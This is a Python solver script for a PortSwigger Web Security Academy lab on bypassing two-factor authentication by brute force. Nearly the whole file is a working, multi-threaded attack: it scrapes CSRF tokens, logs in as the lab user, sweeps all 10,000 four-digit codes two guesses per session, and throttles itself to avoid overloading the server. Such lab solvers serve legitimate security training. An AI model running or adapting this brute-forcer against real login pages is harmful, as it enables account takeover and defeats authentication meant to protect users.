#!/usr/bin/env python3
"""Automated solver: PortSwigger "2FA bypass using a brute-force attack" (EXPERT).

Vulnerability
-------------
The 2FA check at ``POST /login2`` validates a 4-digit code with no rate limit,
no lockout and no per-account attempt budget.  The *only* throttling is
session-scoped: after two wrong codes the server tears the session down
(third attempt -> ``500 "No user logged in"``), so an attacker may burn two
guesses per authenticated session.  Since the code is stable for the account
across logins, sweeping 0000-9999 with a pool of throw-away sessions recovers
it.  A correct code answers ``302 -> /my-account`` (and the lab's
``is-solved`` widget flips).

Attack shape (per worker, per cycle = 5 requests / 2 guesses)
-------------------------------------------------------------
    GET  /login              -> csrf
    POST /login              -> 302 /login2   (session now 1FA-complete)
    GET  /login2             -> csrf2
    POST /login2  code A     -> 200 "Incorrect security code" + fresh csrf
    POST /login2  code B     -> 302 /my-account on success

Nothing instance-specific is hardcoded: the base URL comes from ``--url``,
CSRF tokens and cookies are read from live responses, and the sweep covers the
whole code space.  A shared queue hands out codes so parallel workers never
test the same code twice; unclaimed codes are pushed back if a cycle aborts.

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
    uv run python solve.py --url "<url>" --workers 16 --max-passes 10

Exit codes: 0 verified solved, 1 attack finished without success,
2 usage/environment problem, 3 lab unreachable / expired.
"""
from __future__ import annotations

import argparse
import itertools
import random
import re
import sys
import threading
import time

import httpx

LAB_TITLE = "2fa bypass using a brute-force attack"
USERNAME = "carlos"
PASSWORD = "montoya"
UA = "Mozilla/5.0 (2FA brute-force solver)"

CSRF_RE = re.compile(r'name="csrf"\s+value="([^"]+)"')
TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)


class CircuitBreaker:
    """Global adaptive pause: PortSwigger instances fold under sustained load."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.until = 0.0
        self.level = 0  # 0 = healthy

    def trip(self, reason: str) -> None:
        with self._lock:
            self.level = min(self.level + 1, 4)
            pause = min(3.0 * (2 ** (self.level - 1)), 45.0)
            self.until = max(self.until, time.time() + pause)
            print(f"[!] circuit breaker level {self.level} ({reason}): "
                  f"pausing all workers {pause:.0f}s", flush=True)

    def heal(self) -> None:
        with self._lock:
            if self.level:
                self.level = 0

    def wait(self) -> None:
        while True:
            with self._lock:
                delay = self.until - time.time()
            if delay <= 0:
                return
            time.sleep(min(delay, 1.0))


class Solver:
    def __init__(self, url: str, *, workers: int, max_passes: int,
                 timeout: float, verbose: bool, force: bool = False) -> None:
        self.base = url.rstrip("/")
        self.workers = workers
        self.max_passes = max_passes
        self.timeout = timeout
        self.verbose = verbose
        self.force = force

        self.t0 = time.time()
        self._lock = threading.Lock()
        self.requests = 0
        self.guesses = 0
        self.cycles = 0
        self.found: str | None = None
        self.account_html: str | None = None
        self.account_status: int | None = None
        self.solved = threading.Event()
        self.breaker = CircuitBreaker()

        # shared work list of codes not yet tried, in this pass
        self.queue: list[str] = []
        self.qidx = 0
        self.pass_no = 0
        self.pass_exhausted = threading.Event()

    # -- plumbing ---------------------------------------------------------- #
    def count(self, n: int = 1) -> None:
        with self._lock:
            self.requests += n

    def log(self, msg: str) -> None:
        print(f"[{time.time() - self.t0:6.1f}s] {msg}", flush=True)

    def new_client(self) -> httpx.Client:
        return httpx.Client(
            base_url=self.base, verify=False, timeout=self.timeout,
            follow_redirects=False, http2=True,
            headers={"User-Agent": UA},
        )

    def take_codes(self, n: int = 2) -> list[str]:
        """Claim up to ``n`` untried codes from the shared queue."""
        with self._lock:
            out = []
            while len(out) < n and self.qidx < len(self.queue):
                out.append(self.queue[self.qidx])
                self.qidx += 1
            return out

    def give_back(self, codes: list[str]) -> None:
        """Return still-untried codes to the queue (they were never submitted)."""
        if not codes:
            return
        with self._lock:
            for c in codes:
                self.queue.append(c)

    # -- lab state --------------------------------------------------------- #
    def page_title(self, html: str) -> str:
        m = TITLE_RE.search(html)
        return re.sub(r"\s+", " ", m.group(1)).strip() if m else "?"

    def check_lab(self) -> None:
        try:
            with self.new_client() as c:
                r = c.get("/")
        except Exception as e:  # noqa: BLE001
            raise SystemExit(f"[!] lab unreachable: {e}") from e
        self.count()
        title = self.page_title(r.text)
        self.log(f"lab reachable: HTTP {r.status_code} | title: {title!r}")
        if r.status_code != 200:
            print(f"[!] lab not serving (HTTP {r.status_code}) - instance may be expired",
                  file=sys.stderr)
            raise SystemExit(3)
        if LAB_TITLE not in title.lower():
            raise SystemExit(f"[!] unexpected lab title: {title!r}")
        detected_solved = self.is_solved_html(r.text)
        self.already_solved = detected_solved and not self.force
        if self.already_solved:
            self.log("lab is ALREADY solved (status widget) - nothing to do")

    @staticmethod
    def is_solved_html(html: str) -> bool:
        return "widgetcontainer-lab-status is-solved" in html or "is-solved" in html

    def fetch_status(self) -> bool:
        try:
            with self.new_client() as c:
                r = c.get("/")
            self.count()
            return self.is_solved_html(r.text)
        except Exception:  # noqa: BLE001
            return False

    # -- one login + two guesses ------------------------------------------ #
    def attempt_block(self, client: httpx.Client, codes: list[str]) -> tuple[str | None, list[str]]:
        """Run one login cycle and submit up to two codes.

        Returns ``(winning_code, untried_codes)``.  ``untried_codes`` are codes the
        server never evaluated (session died first) and must be re-queued.
        """
        pending = list(codes)
        # 1. login page -> csrf
        r = client.get("/login")
        self.count()
        if r.status_code != 200:
            return None, pending
        m = CSRF_RE.search(r.text)
        if not m:
            return None, pending
        csrf_login = m.group(1)

        # 2. submit credentials
        r = client.post("/login", data={"csrf": csrf_login, "username": USERNAME,
                                        "password": PASSWORD})
        self.count()
        if r.status_code not in (301, 302):
            return None, pending
        if "/login2" not in r.headers.get("location", ""):
            self.log(f"unexpected login redirect: {r.status_code} "
                     f"{r.headers.get('location')!r}")
            return None, pending

        # 3. MFA page -> csrf
        r = client.get("/login2")
        self.count()
        if r.status_code != 200:
            return None, pending
        m = CSRF_RE.search(r.text)
        if not m:
            return None, pending
        csrf = m.group(1)

        # 4./5. up to two code guesses (the account tolerates two failures per login)
        while pending:
            code = pending[0]
            r = client.post("/login2", data={"csrf": csrf, "mfa-code": code})
            self.count()
            if r.status_code in (301, 302):
                loc = r.headers.get("location", "")
                with self._lock:
                    self.guesses += 1
                if "/my-account" in loc:
                    return code, []               # genuine 2FA success
                # 302 anywhere else (e.g. /login after the session died) is NOT
                # a win; the code was not evaluated properly -> retry it
                if self.verbose:
                    self.log(f"302 -> {loc!r} (code {code}, not a success)")
                return None, pending
            if r.status_code != 200:
                # 500 "No user logged in" / 400 csrf: session (and budget) gone.
                # That code was NOT evaluated -> keep it in `pending`.
                if r.status_code in (502, 503, 504):
                    self.breaker.trip(f"HTTP {r.status_code}")
                return None, pending
            with self._lock:
                self.guesses += 1
            pending.pop(0)
            if "Incorrect security code" not in r.text:
                m = CSRF_RE.search(r.text)
                if not m:
                    return None, pending
                csrf = m.group(1)
                continue
            m = CSRF_RE.search(r.text)
            if not m:
                return None, pending              # no token for the next guess
            csrf = m.group(1)
        return None, []

    # -- worker ------------------------------------------------------------ #
    def worker(self, wid: int) -> None:
        client = self.new_client()
        stagger = min(0.06 * wid, 2.0)
        time.sleep(stagger)
        try:
            while not self.solved.is_set():
                codes = self.take_codes(2)
                if not codes:
                    return
                try:
                    win, untried = self.attempt_block(client, codes)
                except httpx.TransportError as e:
                    self.give_back(codes)
                    self.breaker.trip(f"transport: {type(e).__name__}")
                    self.breaker.wait()
                    continue
                except Exception as e:  # noqa: BLE001
                    self.give_back(codes)
                    if self.verbose:
                        self.log(f"w{wid}: cycle error {type(e).__name__}: {e}")
                    time.sleep(0.2)
                    continue
                with self._lock:
                    self.cycles += 1
                if win is not None:
                    # The 302 already proved the code; read Carlos's account page
                    # on the SAME authenticated session - that is the lab's actual
                    # completion condition (a fresh login would need the code again,
                    # and the code is single-use).
                    try:
                        acct = client.get("/my-account")
                        self.count()
                        with self._lock:
                            self.found = win
                            self.account_status = acct.status_code
                            self.account_html = acct.text
                        self.log(f"code {win}: /my-account -> HTTP {acct.status_code}")
                    except Exception as e:  # noqa: BLE001
                        self.log(f"code {win}: /my-account fetch failed: {e}")
                    self.solved.set()
                    return
                # re-queue every code the server never evaluated
                self.give_back(untried)
                if len(untried) == len(codes):
                    # nothing was even submitted: back off briefly, but do not
                    # punish every other worker for one unlucky session
                    self.breaker.wait()
                    time.sleep(0.1)
                else:
                    self.breaker.heal()
        finally:
            client.close()

    # -- orchestration ----------------------------------------------------- #
    def run_pass(self) -> str | None:
        codes = [f"{i:04d}" for i in range(10000)]
        random.shuffle(codes)
        with self._lock:
            self.queue = codes
            self.qidx = 0
            self.found = None
            self.account_html = None
            self.account_status = None
            self.pass_no += 1
            pno = self.pass_no
        self.solved.clear()
        self.log(f"pass {pno}/{self.max_passes}: sweeping 0000-9999 "
                 f"({self.workers} workers, 2 guesses per login cycle)")

        threads = [threading.Thread(target=self.worker, args=(i,), daemon=True)
                   for i in range(self.workers)]
        for t in threads:
            t.start()

        last_report = time.time()
        last_req = 0
        while any(t.is_alive() for t in threads):
            time.sleep(2.0)
            if self.solved.is_set():
                break
            now = time.time()
            if now - last_report >= 10.0:
                with self._lock:
                    req, gs, cyc, q, qi = (self.requests, self.guesses, self.cycles,
                                           len(self.queue), self.qidx)
                rate = (gs - last_req) / (now - last_report) if last_report else 0
                last_req = gs
                last_report = now
                print(f"    [{now - self.t0:6.1f}s] guesses={gs} "
                      f"({rate:5.1f}/s) requests={req} cycles={cyc} "
                      f"remaining≈{max(q - qi, 0)}", flush=True)
        for t in threads:
            t.join(timeout=30.0)
        return self.found

    def run(self) -> int:
        self.check_lab()
        if self.already_solved:
            self.report(solved=True, code=None, via_widget=True)
            return 0

        for pno in range(1, self.max_passes + 1):
            code = self.run_pass()
            if code is not None:
                self.log(f"*** code {code} ACCEPTED (pass {pno}) ***")
                self.save_evidence(code)
                acct_ok = (self.account_status == 200 and self.account_html is not None
                           and USERNAME in self.account_html.lower())
                widget = self.widget_with_retry(polls=6 if acct_ok else 1)
                self.log(f"verification: account page={'OK' if acct_ok else 'FAIL'}, "
                         f"lab widget={'SOLVED' if widget else 'not solved'}")
                if acct_ok and widget:
                    self.report(solved=True, code=code)
                    return 0
                if widget:
                    self.report(solved=True, code=code, via_widget=True)
                    return 0
                self.log("not verified yet - continuing with the next pass")
            else:
                self.log(f"pass {pno} exhausted with no hit"
                         f"{' (server rotating the code?)' if pno == 1 else ''}")
            if self.fetch_status():
                self.report(solved=True, code=None, via_widget=True)
                return 0
        self.report(solved=False, code=None)
        return 1

    def widget_with_retry(self, polls: int = 1, delay: float = 2.0) -> bool:
        """Read the lab status widget, polling briefly: the flip can lag the 2FA."""
        for i in range(max(1, polls)):
            if self.fetch_status():
                return True
            if i + 1 < polls:
                time.sleep(delay)
        return False

    def save_evidence(self, code: str) -> None:
        """Persist the winning account page (proof of access) next to the solver."""
        if not self.account_html:
            return
        try:
            import os
            d = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "my-account.html"), "w") as fh:
                fh.write(self.account_html)
        except OSError:
            pass

    def report(self, *, solved: bool, code: str | None, via_widget: bool = False) -> None:
        el = time.time() - self.t0
        print()
        print("=" * 68)
        print(f"lab        : {LAB_TITLE}")
        print(f"target     : {self.base}")
        print(f"result     : {'SOLVED' if solved else 'NOT SOLVED'}")
        print(f"code       : {code if code else ('(already solved)' if via_widget else '-')}")
        print(f"guesses    : {self.guesses}")
        print(f"requests   : {self.requests}")
        print(f"cycles     : {self.cycles}")
        print(f"elapsed    : {el:.1f}s")
        if el:
            print(f"throughput : {self.guesses / el:.1f} guesses/s, "
                  f"{self.requests / el:.1f} req/s")
        print("=" * 68)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Brute-force the 4-digit 2FA code (2 guesses per login session) "
                    "and verify access to Carlos's account.")
    ap.add_argument("--url", required=True, help="lab base URL")
    ap.add_argument("--workers", type=int, default=20,
                    help="parallel login sessions (default 20)")
    ap.add_argument("--max-passes", type=int, default=8,
                    help="full 0000-9999 sweeps to try if the code rotates (default 8)")
    ap.add_argument("--timeout", type=float, default=20.0, help="per-request timeout")
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--force", action="store_true",
                    help="run even if the lab widget already says solved")
    args = ap.parse_args()

    s = Solver(args.url, workers=max(1, args.workers),
               max_passes=max(1, args.max_passes), timeout=args.timeout,
               verbose=args.verbose, force=args.force)
    return s.run()


if __name__ == "__main__":
    sys.exit(main())
